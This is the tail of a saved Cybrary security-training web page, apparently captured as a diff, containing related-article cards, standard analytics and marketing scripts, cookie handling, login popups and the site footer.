+</a><div data-coid="Netflix Account Takeover Vulnerability" data-chid="" class="relatedcard"><a style="color:#000;" href="https://www.cybrary.it/0p3n/netflix-account-takeover-vulnerability/" class="external" target="_self"></a><div class="relatedcardleftside"><a style="color:#000;" href="https://www.cybrary.it/0p3n/netflix-account-takeover-vulnerability/" class="external" target="_self"><div class="relatedcardtitle">Netflix Account Takeover Vulnerability</div></a><div class="relatedcardavatar"><a style="color:#000;" href="https://www.cybrary.it/0p3n/netflix-account-takeover-vulnerability/" class="external" target="_self"></a><a href="https://www.cybrary.it/members/shaquib/"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/39aaf73858079f20e747cd4f00c7827a" srcset="//www.gravatar.com/avatar/39aaf73858079f20e747cd4f00c7827a?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></a></div><div class="relatedcarddetails"><div class="relatedcarddate">April 26, 2018</div><div class="relatedcardname">By: <a target="_blank" href="https://www.cybrary.it/members/shaquib/">Shaquib Izhar</a></div></div><div class="relatedcardviews">6696</div></div><div class="relatedcardrightside"><div style="background: url('https://www.cybrary.it/wp-content/uploads/2018/04/open57purple.jpg') no-repeat;background-size:cover;height:100px;"></div></div><div class="clear"></div></div><a style="color:#000;" href="https://www.cybrary.it/0p3n/personal-guide-staying-anonymous/" class="external" target="_self">
+</a><div data-coid="Your Personal Guide to Staying Anonymous" data-chid="" class="relatedcard"><a style="color:#000;" href="https://www.cybrary.it/0p3n/personal-guide-staying-anonymous/" class="external" target="_self"></a><div class="relatedcardleftside"><a style="color:#000;" href="https://www.cybrary.it/0p3n/personal-guide-staying-anonymous/" class="external" target="_self"><div class="relatedcardtitle">Your Personal Guide to Staying Anonymous</div></a><div class="relatedcardavatar"><a style="color:#000;" href="https://www.cybrary.it/0p3n/personal-guide-staying-anonymous/" class="external" target="_self"></a><a href="https://www.cybrary.it/members/bigcode1991/"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/37b8603a3f4babfd07b7725c142d1b99" srcset="//www.gravatar.com/avatar/37b8603a3f4babfd07b7725c142d1b99?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></a></div><div class="relatedcarddetails"><div class="relatedcarddate">December 10, 2016</div><div class="relatedcardname">By: <a target="_blank" href="https://www.cybrary.it/members/bigcode1991/">bigcode1991 </a></div></div><div class="relatedcardviews">11820</div></div><div class="relatedcardrightside"><div style="background: url('https://www.cybrary.it/wp-content/uploads/2016/12/Anonymous.jpg') no-repeat;background-size:cover;height:100px;"></div></div><div class="clear"></div></div><a style="color:#000;" href="https://www.cybrary.it/channelcontent/debunking-these-3-domain-name-registration-myths-once-and-for-all/" class="external" target="_self">
+</a><div data-coid="Debunking these 3 Domain Name Registration Myths Once and For All" data-chid="AT&amp;T CyberSecurity" class="relatedcard"><a style="color:#000;" href="https://www.cybrary.it/channelcontent/debunking-these-3-domain-name-registration-myths-once-and-for-all/" class="external" target="_self"></a><div class="relatedcardleftside"><a style="color:#000;" href="https://www.cybrary.it/channelcontent/debunking-these-3-domain-name-registration-myths-once-and-for-all/" class="external" target="_self"><div class="relatedcardtitle">Debunking these 3 Domain Name Registration Myths O ...</div></a><div class="relatedcardavatar"><a style="color:#000;" href="https://www.cybrary.it/channelcontent/debunking-these-3-domain-name-registration-myths-once-and-for-all/" class="external" target="_self"></a><a href="https://www.cybrary.it/channel/att-cybersecurity/"><img src="Hacking%20Database%20-%20Cybrary_files/image1551194704.jpg"></a></div><div class="relatedcarddetails"><div class="relatedcarddate">February 12, 2018</div><div class="relatedcardname">By: <a href="https://www.cybrary.it/channel/att-cybersecurity/">AT&amp;T CyberSecurity</a></div></div><div class="relatedcardviews">212</div></div><div class="relatedcardrightside"><div style="background: url('/wp-content/uploads/channel/55676/image1551195424.jpeg') no-repeat;background-size:cover;height:100px;"></div></div><div class="clear"></div></div><a style="color:#000;" href="https://www.cybrary.it/channelcontent/new-cyberthreat-survey-confirms-biggest-security-obstacle-is-low-user-security-awareness/" class="external" target="_self">
+</a><div data-coid="New CyberThreat Survey Confirms: Biggest Security Obstacle Is Low User Security Awareness" data-chid="KnowBe4" class="relatedcard"><a style="color:#000;" href="https://www.cybrary.it/channelcontent/new-cyberthreat-survey-confirms-biggest-security-obstacle-is-low-user-security-awareness/" class="external" target="_self"></a><div class="relatedcardleftside"><a style="color:#000;" href="https://www.cybrary.it/channelcontent/new-cyberthreat-survey-confirms-biggest-security-obstacle-is-low-user-security-awareness/" class="external" target="_self"><div class="relatedcardtitle">New CyberThreat Survey Confirms: Biggest Security  ...</div></a><div class="relatedcardavatar"><a style="color:#000;" href="https://www.cybrary.it/channelcontent/new-cyberthreat-survey-confirms-biggest-security-obstacle-is-low-user-security-awareness/" class="external" target="_self"></a><a href="https://www.cybrary.it/channel/knowbe4/"><img src="Hacking%20Database%20-%20Cybrary_files/image1513810135.jpg"></a></div><div class="relatedcarddetails"><div class="relatedcarddate">December 2, 2017</div><div class="relatedcardname">By: <a href="https://www.cybrary.it/channel/knowbe4/">KnowBe4</a></div></div><div class="relatedcardviews">466</div></div><div class="relatedcardrightside"><div style="background: url('https://www.cybrary.it/wp-content/uploads/2017/12/rsschan_106670_1-300x270.jpe') no-repeat;background-size:cover;height:100px;"></div></div><div class="clear"></div></div><div class="clear"></div></div><div class="clear"></div></div>  <div class="alert-banner">
+
+      </div>
+  <script>
+
+//Remove email verification banner
+jQuery(document).ready(function(){
+  jQuery(".js_close_banner").click(function(){
+    var trigg = jQuery(this).data("trigg");
+    jQuery("[data-trigg='"+trigg+"'].alert-banner-notification").hide();
+    jQuery("[data-trigg='"+trigg+"'].alert-banner-maintenance").hide();
+  });
+});
+
+// Defer images below fold
+function init() {
+  var imgDefer = document.getElementsByTagName('img');
+  for (var i=0; i<imgDefer.length; i++) {
+    if(imgDefer[i].getAttribute('data-src')) {
+      imgDefer[i].setAttribute('src',imgDefer[i].getAttribute('data-src'));
+    }
+  }
+}
+window.onload = init;
+
+  if(!isUserInEu() || isUserOptInTracking()){
+    loadScripts();
+  }
+  else{
+    setInterval(wipeAllCookies, 1000);    function ga(){
+      console.log('3rd Party Scripts are blocked');
+    }
+    window.ga = ga;
+  }
+
+  function wipeAllCookies(){
+    var cookies = document.cookie.split(";");
+    for (var i = 0; i < cookies.length; i++){
+      eraseCookie(cookies[i].split("=")[0]);
+    }
+  }
+
+  function eraseCookie(name) {
+      createCookie(name,"",-1);
+  }
+
+  function createCookie(name,value,days) {
+    if (days) {
+      var date = new Date();
+      date.setTime(date.getTime()+(days*24*60*60*1000));
+      var expires = "; expires="+date.toGMTString();
+    }
+    else {
+      var expires = "";
+    }
+    document.cookie = name+"="+value+expires+"; path=/";
+  }
+
+  function isUserInEu(){
+    return getUserCountry() == 'EU';
+  }
+
+  function isUserOptInTracking(){
+    return null;  }
+
+  function getUserCountry(){
+    var USER_COUNTRY_KEY = 'user_country';
+    var userCountry = sessionStorage.getItem(USER_COUNTRY_KEY);
+    if(!userCountry){
+      jQuery.post('/bin/utils/geo.php').done(function(data){
+        sessionStorage.setItem(USER_COUNTRY_KEY, data);
+        return data;
+      })
+    }
+    return userCountry;
+  }
+
+  function loadScripts(){
+
+    //Google Analytics
+    (function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
+    h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
+    (a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
+    })(window,document.documentElement,'async-hide','dataLayer',4000,
+    {'GTM-WRVPTFB':true});
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-56709046-1', 'auto');
+    ga('require', 'GTM-WRVPTFB');
+    ga('require', 'displayfeatures');
+    ga('set', 'dimension3', 'No');
+    ga('send', 'pageview');
+    //Google Tag Manager
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-KVNRWXV');
+
+    ///RTP tag
+    var siteUrl = window.location.href;
+        if ( siteUrl.indexOf('/team/') == -1 && siteUrl.indexOf('/cybrary-live-channel') == -1 && siteUrl.indexOf('/learner-evaluation') == -1 && siteUrl.indexOf('/business') == -1) {
+      (function(c,h,a,f,i,e){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      c[a].a=i;c[a].e=e;var g=h.createElement("script");g.async=true;g.type="text/javascript";
+      g.src=f+'?aid='+i;var b=h.getElementsByTagName("script")[0];b.parentNode.insertBefore(g,b);
+      })(window,document,"rtp","//sjrtp-cdn.marketo.com/rtp-api/v1/rtp.js","cybrary1");
+      rtp('send','view');
+      rtp('get', 'campaign',true);
+    }
+    //Facebook Pixel
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window,document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '170922003476099');
+    fbq('track', 'PageView');
+    //Marketo Munchkin
+    (function() {
+      var didInit = false;
+      function initMunchkin() {
+        if(didInit === false) {
+          didInit = true;
+          Munchkin.init('948-BSI-099', {domainLevel: 2});
+        }
+      }
+      var s = document.createElement('script');
+      s.type = 'text/javascript';
+      s.async = true;
+      s.src = '//munchkin.marketo.net/munchkin.js';
+      s.onreadystatechange = function() {
+        if (this.readyState == 'complete' || this.readyState == 'loaded') {
+          initMunchkin();
+        }
+      };
+      s.onload = initMunchkin;
+      document.getElementsByTagName('head')[0].appendChild(s);
+    })()
+  }
+</script>
+ <script>
+ var V3_APP_URL = 'https://app-course.cybrary.it';
+
+    localStorage.removeItem('jwt');
+</script>
+<script>
+jQuery(document).ready(function(){
+
+  jQuery('#ga_exitmunson, #ga_exitmunson2').click(function(){
+    if(!isUserInEu()){
+      var today = new Date();
+      var expire = new Date();
+      expire.setTime(today.getTime() + 3600000*24*7);
+      document.cookie = "teampromo=true;domain=cybrary.it;path=/;expires="+expire.toGMTString();
+    }
+  });
+});
+</script>
+</div><!-- end page-content -->
+
+<!-- embed the loader div -->
+<div class="loaderdiv">
+  <div class="spinner">
+    <div class="double-bounce1"></div>
+    <div class="double-bounce2"></div>
+  </div>
+</div>
+
+<div id="profile_hover_container" class="profile_hover_container"></div>
+<div class="clear"></div>
+
+        <div id="bottom-bg">
+        <div id="bottom" class="container_24">
+            <div class="bottom-content-padding">
+<div id="bottom_1" class="one_fourth"><div class="column-content-wrapper"><div class="bottom-col-content widget_text substitute_widget_class"><h3 class="bottom-col-title">Our Revolution</h3>			<div class="textwidget">We
+ believe Cyber Security training should be free, for everyone, FOREVER. 
+Everyone, everywhere, deserves the OPPORTUNITY to learn, begin and grow a
+ career in this fascinating field. Therefore, Cybrary is a free 
+community where people, companies and training come together to give 
+everyone the ability to collaborate in an open source way that is 
+revolutionizing the cyber security educational experience.</div>
+		</div></div></div><!-- end bottom_1 --><div id="bottom_2" class="one_fourth"><div class="column-content-wrapper"><div class="bottom-col-content widget_text substitute_widget_class"><h3 class="bottom-col-title">Student Support</h3>			<div class="textwidget"><a class="flat-custom-button align-btn-left" href="https://help.cybrary.it/" title="Get Support"><span style="padding:10px 20px; background-color:#1C2023; border:1px solid #617584; color:#03A2D6; font-size:20px;">Get Support</span></a>
+</div>
+		</div><div class="bottom-col-content widget_nav_menu custom-formatting"><h3 class="bottom-col-title">Other Pages</h3><div class="menu-footer-links-container"><ul id="menu-footer-links" class="menu"><li id="menu-item-4689" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4689"><a href="https://www.cybrary.it/about/">About</a></li>
+<li id="menu-item-26046" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26046"><a href="https://www.cybrary.it/join-our-team/">Join Our Team</a></li>
+<li id="menu-item-2648" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2648"><a href="https://www.cybrary.it/press/">Press</a></li>
+<li id="menu-item-4690" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4690"><a href="https://www.cybrary.it/terms-service/">Terms of Service</a></li>
+<li id="menu-item-63128" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-63128"><a href="https://www.cybrary.it/verify-certificate/">Verify Certificate</a></li>
+<li id="menu-item-64470" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-64470"><a href="https://www.cybrary.it/suggestions/">Submit Suggestions</a></li>
+<li id="menu-item-88800" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-88800"><a href="https://www.cybrary.it/companies/">Companies</a></li>
+</ul></div></div></div></div><!-- end bottom_2 --><div id="bottom_3" class="one_fourth"><div class="column-content-wrapper"><div class="bottom-col-content widget_text substitute_widget_class"><h3 class="bottom-col-title">Support Cybrary</h3>			<div class="textwidget"><p><strong><a href="https://www.cybrary.it/contributors/"><img src="Hacking%20Database%20-%20Cybrary_files/D-09-2019.png" data-src="/wp-content/uploads/badges/D-09-2019.png" class="alignleft"></a><a href="https://www.cybrary.it/contributors/">Donate Here</a> to Get This Month's Donor Badge</strong></p>
+<div class="clear"></div>
+<div style="height:10px;">&nbsp;</div>
+
+</div>
+		</div></div></div><!-- end bottom_3 --><div id="bottom_4" class="one_fourth last_column"><div class="column-content-wrapper"><div class="bottom-col-content widget_text substitute_widget_class"><h3 class="bottom-col-title">Cybrary|0P3N</h3>			<div class="textwidget"><div class="widget-sme">
+<div class="msc_entry"><div class="uimage"><a href="https://www.cybrary.it/members/tomcondrasky/" class="level-3"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/f8fb7215b87969e97caa4b9d1c838235" srcset="//www.gravatar.com/avatar/f8fb7215b87969e97caa4b9d1c838235?s=30&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-30 photo" width="30" height="30"></a><br><a href="https://www.cybrary.it/members/tomcondrasky/" class="level-3">Tom Condrasky</a></div><strong><a href="https://www.cybrary.it/0p3n/2019-black-hat-conference-debrief-key-takeaways-insights/">2019 Black Hat Conference Debrief: Key Takeaways and Insights</a></strong><br><span style="color:#B0B0B0;font-size:11px;">Views: 1577 / August 30, 2019</span></div><div class="msc_entry"><div class="uimage"><a href="https://www.cybrary.it/members/slwelty/" class="level-3"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/88c01b1a9e3e5ba397ca51f2b896c57f" srcset="//www.gravatar.com/avatar/88c01b1a9e3e5ba397ca51f2b896c57f?s=30&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-30 photo" width="30" height="30"></a><br><a href="https://www.cybrary.it/members/slwelty/" class="level-3">slwelty</a></div><strong><a href="https://www.cybrary.it/0p3n/building-a-risk-based-cybersecurity-architecture/">Building a Risk-Based Cybersecurity Architecture</a></strong><br><span style="color:#B0B0B0;font-size:11px;">Views: 2308 / August 28, 2019</span></div><div class="msc_entry"><div class="uimage"><a href="https://www.cybrary.it/members/vikash71/" class="level-3"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/7ef860310dd6f82cf85db62dc8e3d1cb" srcset="//www.gravatar.com/avatar/7ef860310dd6f82cf85db62dc8e3d1cb?s=30&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-30 photo" width="30" height="30"></a><br><a href="https://www.cybrary.it/members/vikash71/" class="level-3">Vikrant Saran</a></div><strong><a href="https://www.cybrary.it/0p3n/cissp-certification-exam-how-difficult-is-it-to-pass/">CISSP Certification Exam: How difficult is it to pass?</a></strong><br><span style="color:#B0B0B0;font-size:11px;">Views: 2687 / August 27, 2019</span></div><div class="msc_entry"><div class="uimage"><a href="https://www.cybrary.it/members/pteamrose/" class="level-2"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/55f720f95c498a9e84e3e244a28c6df6" srcset="//www.gravatar.com/avatar/55f720f95c498a9e84e3e244a28c6df6?s=30&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-30 photo" width="30" height="30"></a><br><a href="https://www.cybrary.it/members/pteamrose/" class="level-2">CatPhish_Billy</a></div><strong><a href="https://www.cybrary.it/0p3n/the-cybersecurity-talent-shortage-and-how-we-can-address-it/">The Cybersecurity Talent Shortage</a></strong><br><span style="color:#B0B0B0;font-size:11px;">Views: 4388 / August 23, 2019</span></div>
+</div></div>
+		</div></div></div><!-- end bottom_4 -->
+                        <div class="social">
+                         <ul class="soc">
+                           <li class="fus">FOLLOW US:</li>
+                           <li><a class="soc-twitter" href="https://twitter.com/cybraryit" target="_blank"></a></li>
+                           <li><a class="soc-facebook" href="https://www.facebook.com/cybraryit" target="_blank"></a></li>
+                           <li><a class="soc-google" href="https://www.google.com/+Cybraryit" target="_blank"></a></li>
+                           <li><a class="soc-linkedin soc-icon-last" href="https://www.linkedin.com/company/cybrary?trk=company_logo" target="_blank"></a></li>
+                         </ul>
+                         <div class="alignmiddle" style="margin-top:10px;margin-bottom:50px;">
+
+                          Protected by
+                           <div>
+                             <a href="https://www.signalsciences.com/" target="_blank">
+                               <img style="width:200px;margin-left:10px" src="Hacking%20Database%20-%20Cybrary_files/signal-logo.png" data-src="/wp-content/uploads/signal-logo.png">
+                             </a>
+                           </div>
+                         </div>
+
+                        </div>
+
+
+
+                                    </div>
+            <!-- end bottom-content-padding -->
+        </div>
+        <!-- end bottom -->
+        </div>
+        <!-- end bottom-bg -->
+
+        <div class="clear"></div>
+
+            <div class="push"></div>
+            <div class="clear"></div>
+
+        </div><!-- end wrapper-1 -->
+        <div id="footer-bg">
+        <div id="footer" class="container_24 footer-top">
+            <div id="footer_text" class="grid_20">
+            <div>
+© 2018 <strong>Cybrary.IT</strong> - <a href="https://www.cybrary.it/privacy-policy/">Privacy Policy</a> - <a href="https://www.cybrary.it/terms-service/">Terms of Service</a>            </div>
+            </div>
+            <div class="back-to-top">
+            <a href="#top">Back to Top</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="clear"></div>
+
+      <div class="modal-cover" id="js-optin-wrap">
+       <div class="underlay"></div>
+        <div class="modal">
+        <p><span class="l1">Did You Know?</span></p>
+        <p><span class="l2">Cybrary has tons of FREE training resources!</span></p>
+        <p><span class="l3">For lifetime access simply <a class="bp-ajaxr" href="https://www.cybrary.it/register/">CREATE A FREE ACCOUNT</a>. <br> Already a member? <a href="https://www.cybrary.it/wp-login.php">login here</a>.</span></p>
+        <p><a href="#" class="js-optin-close">No thanks.</a></p>
+        </div>
+      </div>
+      <script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/admin-bar.js" data-cfasync="false"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/editor.js" data-cfasync="false"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/comment-reply.js" data-cfasync="false"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/superfish.js" data-cfasync="false"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var udesign_script_vars = {"search_widget_placeholder":"Type here to search","disable_smooth_scrolling_on_pages":null,"remove_fixed_menu_on_mobile":null};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/script.js" data-cfasync="false"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/selectnav.js" data-cfasync="false"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var udesign_selectnav_vars = {"selectnav_menu_label":"Navigation"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/selectnav-options.js" data-cfasync="false"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var ubermenu_data = {"remove_conflicts":"on","reposition_on_load":"off","intent_delay":"300","intent_interval":"100","intent_threshold":"7","scrollto_offset":"50","scrollto_duration":"1000","responsive_breakpoint":"959","accessible":"on","retractor_display_strategy":"responsive","touch_off_close":"on","v":"3.2.0.2","ajax_url":"https:\/\/www.cybrary.it\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/ubermenu.js" data-cfasync="false"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/wp-embed.js" data-cfasync="false"></script>
+		<div id="wpadminbar" class="">
+							<a class="screen-reader-shortcut" href="#wp-toolbar" tabindex="1">Skip to toolbar</a>
+						<div class="quicklinks" id="wp-toolbar" role="navigation" aria-label="Toolbar" tabindex="0">
+				<ul id="wp-admin-bar-root-default" class="ab-top-menu">
+		<li id="wp-admin-bar-bp-login"><a class="ab-item" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in</a>		</li>
+		<li id="wp-admin-bar-bp-register"><a class="ab-item" href="https://www.cybrary.it/register/">Register</a>		</li>
+		<li id="wp-admin-bar-my-account"><div class="ab-item ab-empty-item"></div>		</li></ul>			</div>
+					</div>
+
+		
+
+<style type="text/css" media="screen">
+    @media screen and ( max-width: 720px ) {
+        html { margin-top: 0px !important; }
+        * html body { margin-top: 46px !important; }
+    }
+</style>
+
+ <script>
+
+  function show_registration_box(){
+    if(jQuery.magnificPopup && !jQuery.magnificPopup.instance.isOpen) {
+      jQuery( "#wp-admin-bar-bp-register a" ).trigger( "click" );
+      jQuery('#wpadminbar').css({'display':'none'});
+    }
+  }
+  var registrationTimeout = window.setTimeout( show_registration_box, 30000 );
+  function show_login_box(){
+    if(jQuery.magnificPopup && jQuery.magnificPopup.instance.isOpen) {
+      jQuery('#wp-admin-bar-bp-register').css({'display':'none'});
+      jQuery('.login_members').html('<a href="https://www.cybrary.it/wp-login.php?redirect_to=%2F0p3n%2Fhacking-database%2F">Log in</a>');
+    }
+  }
+  var loginWindowDelay = 30; //Seconds		+  window.setTimeout( show_login_box, 32000 );
+  window.setTimeout( show_login_box, loginWindowDelay * 1000 );
+
+</script>
+
+  
+<script>
+jQuery(document).ready(function(){
+    var showChar = 300;  // How many characters are shown by default
+    var ellipsestext = "...";
+    var moretext = "Read More";
+    var lesstext = "Read Less";
+
+
+    jQuery('.more').each(function() {
+        var content = jQuery(this).html();
+
+        if(content.length > showChar) {
+
+            var c = content.substr(0, showChar);
+            var h = content.substr(showChar, content.length - showChar);
+
+            var html = c + '<span class="moreellipses">' + ellipsestext+ '&nbsp;</span><span class="morecontent"><span>' + h + '</span>&nbsp;&nbsp;<a href="" class="morelink">' + moretext + '</a></span>';
+
+            jQuery(this).html(html);
+        }
+
+    });
+
+    jQuery(".morelink").click(function(){
+        if(jQuery(this).hasClass("less")) {
+            jQuery(this).removeClass("less");
+            jQuery(this).html(moretext);
+        } else {
+            jQuery(this).addClass("less");
+            jQuery(this).html(lesstext);
+        }
+        jQuery(this).parent().prev().toggle();
+        jQuery(this).prev().toggle();
+        return false;
+    });
+     var mousemove = false;
+    jQuery(".profilecard").live("mouseenter", function() {
+    var p_height = jQuery(this).height();
+    var position = jQuery(this).offset();
+    var top_val = position.top
+    var newtop = top_val - jQuery(window).scrollTop()
+    var uid = jQuery(this).data("uid");
+    var uname = jQuery(this).data("uname");
+      timer = setTimeout(function(){
+        if(profile.hasOwnProperty(uid)){
+          jQuery("#profile_hover_container.profile_hover_container").html(profile[ uid ]);
+        if(newtop > (jQuery(window).height() / 2)){
+            top_val = top_val - jQuery("#profile_hover_container.profile_hover_container").height() - 10;
+            jQuery(".sw_hc").css("margin-bottom", "100px");
+          }
+          jQuery(".sw_hc").css("margin-top", p_height+5);
+          jQuery("#profile_hover_container.profile_hover_container").css({top: top_val, left: position.left, position:'absolute', display:'flex'});
+          mousemove = true;
+        }
+        else{
+          jQuery.post("/bin/profile_card_loader.php", {uid:uid, uname:uname, type:2}).done(function(data){
+            profile[ uid ] = data;
+            jQuery("#profile_hover_container.profile_hover_container").html(profile[ uid ]);
+        if(newtop > (jQuery(window).height() / 2)){
+            top_val = top_val - jQuery("#profile_hover_container.profile_hover_container").height() - 10;
+            jQuery(".sw_hc").css("margin-bottom", "100px");
+          }
+          jQuery(".sw_hc").css("margin-top", p_height+5);
+          jQuery("#profile_hover_container.profile_hover_container").css({top: top_val, left: position.left, position:'absolute', display:'flex'});
+          mousemove = true;
+          });
+        }
+      }, 500);
+  }).live("mouseleave", function(e) {
+      if(!jQuery(e.toElement).hasClass("profile_hover_container")){
+        jQuery("#profile_hover_container.profile_hover_container").css("display", "none");
+        mousemove = false;
+      }
+      clearTimeout(timer);
+  });
+  jQuery(document).mousemove(function(e){
+    if(mousemove){
+      if(!jQuery(e.target).hasClass("profile_hover_container") && !(jQuery(e.target).parents('.sw_hc').length > 0)){
+        jQuery("#profile_hover_container.profile_hover_container").css("display", "none");
+
+        mousemove = false;
+      }
+    }
+  });
+});
+</script>
+<script>
+var openFile = function(event) {
+     var input = event.target;
+     var reader = new FileReader();
+     reader.onload = function(){
+      var dataURL = reader.result;
+      var output = document.getElementById('img-uploaded');
+      output.src = dataURL;
+      document.getElementById('sw_cardimagearea').style.display = "block";
+     };
+     reader.readAsDataURL(input.files[0]);
+};
+</script>
+<script>
+jQuery(document).ready(function(){
+    var link = "";
+    jQuery(".sw_safelinkpopup").live("click", function(){
+        link = jQuery(this).html();
+        jQuery(".sw_safelinkdiv").css("display", "flex");
+    });
+    jQuery(".offsite-trig").click(function(){
+        if(jQuery(this).data("choice") == "1"){
+      var linktest = link.substr(0, 7);
+      if(linktest != "https:/" && linktest != "http://"){
+        link = "https://"+link;
+      }
+            window.open(link, '_blank');
+        }
+        jQuery(".sw_safelinkdiv").css("display", "none");
+    });
+});
+</script>
+<div class="sw_safelinkdiv"><div class="off-site-container"><p>We recommend always using caution when following any link</p><p>Are you sure you want to continue?</p><div class="off-site-choices"><div style=" background-color:#019000; border-color:#019000;" class="offsite-trig" data-choice="1">Continue</div><div style="margin-left: 33px;" class="offsite-trig" data-choice="2">Cancel</div></div></div></div>
+<script type="text/javascript">
+window.zESettings = {
+  webWidget: {
+    chat: {
+      suppress: true
+    },
+    helpCenter: {
+      suppress: true
+    }
+  }
+};
+</script>
+
+
+
+
+</body></html>
+<!--
+Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/
+
+
+Served from: localhost @ 2019-09-03 00:32:03 by W3 Total Cache
+-->
